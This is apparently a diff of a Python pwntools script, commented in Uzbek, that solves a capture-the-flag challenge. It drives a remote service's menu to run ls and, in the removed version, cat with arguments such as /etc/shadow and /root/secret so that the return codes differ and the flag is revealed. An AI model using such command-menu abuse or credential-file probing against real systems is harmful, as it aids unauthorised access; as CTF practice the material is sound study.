@@ -1,63 +1,49 @@
-import socket
-import time
+from pwn import *
+
+# Server ma'lumotlari
+host = '154.57.164.68'
+port = 31363
 
 def solve():
-    host = '154.57.164.68'
-    port = 31363
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(5)
+    # context.log_level = 'debug' # Server bilan muloqotni ko'rish uchun buni yoqish mumkin
     
     try:
-        s.connect((host, port))
+        # Ulanish
+        r = remote(host, port, timeout=10)
         
-        def wait_and_send(payload):
-            # Serverdan savol kelishini kutamiz
-            chunk = b""
-            while b"> " not in chunk:
-                try:
-                    data = s.recv(1024)
-                    if not data: break
-                    chunk += data
-                except:
-                    break
-            print(f"Server: {chunk.decode(errors='ignore').strip()}")
-            print(f"Sending: {payload}")
-            s.sendall(payload.encode() + b'\n')
-            time.sleep(0.3)
-
-        # 1. Mode
-        wait_and_send("1")
-        wait_and_send("-1")
-
-        # 2. Bin
-        wait_and_send("2")
-        wait_and_send("cat")
-
-        # 3. Arguments
-        # Bizga debug[0] != debug[1] kerak. 
-        # 'cat .' (rc=1), 'cat /etc/shadow' (rc=1) bo'lib qolishi mumkin.
-        # Shuning uchun 'cat' va 'ls'ni aralashtirib ko'ramiz yoki:
-        wait_and_send("3")
-        # 'cat' ga bitta papka va bitta mavjud bo'lmagan fayl beramiz
-        wait_and_send(".,/root/secret") 
-
-        # 4. Switches
-        wait_and_send("4")
-        wait_and_send(".,.")
-
-        # 5. Execute
-        wait_and_send("5")
-
-        # Flagni kutish
-        time.sleep(1)
-        print("\n[+] Final Output:")
-        print(s.recv(4096).decode(errors='ignore'))
-
+        # 1. Mode o'rnatish
+        r.sendlineafter(b'> ', b'1')
+        r.sendlineafter(b'(mode)> ', b'-1')
+        
+        # 2. Bin o'rnatish
+        r.sendlineafter(b'> ', b'2')
+        r.sendlineafter(b'(bin)> ', b'ls')
+        
+        # 3. Argumentlar
+        # ls buyrug'ida 1 va 2 returncode olish uchun:
+        # 1-arg: /etc/shadow (Ruxsat yo'q - rc=1 yoki 2)
+        # 2-arg: /davron_yoq (Topilmadi - rc=2)
+        r.sendlineafter(b'> ', b'3')
+        r.sendlineafter(b'(arg1,arg2)> ', b'/etc/shadow,/davron_yoq')
+        
+        # 4. Switchlar
+        # Nuqta - xavfsiz tanlov, chunki minus taqiqlangan
+        r.sendlineafter(b'> ', b'4')
+        r.sendlineafter(b'(switch1,switch2)> ', b'.,.')
+        
+        # 5. Beat the competitor!
+        r.sendlineafter(b'> ', b'5')
+        
+        # Flagni kutamiz
+        print("\n--- FLAG ---")
+        # Server barcha natijalarni chiqarishini kutamiz
+        final_output = r.recvall(timeout=5).decode(errors='ignore')
+        print(final_output)
+        
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"Xatolik: {e}")
     finally:
-        s.close()
+        r.close()
 
 if __name__ == "__main__":
     solve()
